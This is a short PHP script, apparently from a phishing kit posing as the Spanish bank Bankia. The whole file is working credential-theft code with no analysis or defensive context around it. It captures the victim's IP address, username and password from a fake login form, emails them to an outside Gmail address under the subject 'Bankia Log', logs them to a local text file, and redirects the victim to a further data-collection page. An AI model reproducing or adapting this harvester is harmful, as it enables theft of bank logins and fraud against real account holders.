<?php
$ip = getenv("REMOTE_ADDR");

$message .= "\n";
$message .= "\n";
$message .= "\n";
$message .= "| IP : $ip ------------------\n";
$message .= "Usuario : ".$_POST['identificador']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "| Th3 MasT3r Z------------------\n";
$message .= "\n";
$message .= "\n";
$message .= "\n";


$send = "bankia.es.club@gmail.com";
$subject = "| Bankia Log | $ip |";
$from = "From: TMZ <tmz@localhost.com>";
mail($send,$subject,$message,$from);

$file = fopen("../bella.txt", 'a');
fwrite($file, $message);


echo "<script>window.top.location.href = \"datos.html?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."\"; </script>";

?>
}
